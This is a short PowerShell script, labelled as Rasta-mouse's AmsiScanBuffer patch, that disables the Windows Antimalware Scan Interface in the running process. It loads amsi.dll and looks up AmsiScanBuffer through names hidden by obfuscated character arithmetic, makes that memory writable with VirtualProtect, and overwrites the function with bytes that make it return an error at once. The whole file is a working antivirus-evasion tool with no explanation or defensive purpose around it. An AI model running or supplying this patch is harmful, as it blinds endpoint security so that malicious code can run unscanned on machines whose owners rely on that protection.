#Rasta-mouses Amsi-Scan-Buffer patch \n
$cykrs = @"
using System;
using System.Runtime.InteropServices;
public class cykrs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr rirsde, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $cykrs

$pqfuftg = [cykrs]::LoadLibrary("$([CHAR]([byte]0x61)+[ChAR](109+54-54)+[CHAR](63+52)+[ChaR]([byTe]0x69)+[chAr](33+13)+[chAr]([bYTE]0x64)+[ChAr]([BytE]0x6c)+[cHar](108))")
$wvcdyy = [cykrs]::GetProcAddress($pqfuftg, "$([chAr]([byte]0x41)+[CHaR]([ByTE]0x6d)+[CHAr](115*58/58)+[chAR](61+44)+[cHar](83+41-41)+[chAR](28+71)+[cHar]([byTE]0x61)+[cHar]([BYte]0x6e)+[char](42+24)+[CHar]([BYTe]0x75)+[chAr]([BytE]0x66)+[char]([ByTe]0x66)+[cHaR]([BYTE]0x65)+[cHAR](114))")
$p = 0
[cykrs]::VirtualProtect($wvcdyy, [uint32]5, 0x40, [ref]$p)
$abkt = "0xB8"
$npzm = "0x57"
$zvla = "0x00"
$emaz = "0x07"
$hiwk = "0x80"
$ebrr = "0xC3"
$ucixq = [Byte[]] ($abkt,$npzm,$zvla,$emaz,+$hiwk,+$ebrr)
[System.Runtime.InteropServices.Marshal]::Copy($ucixq, 0, $wvcdyy, 6)
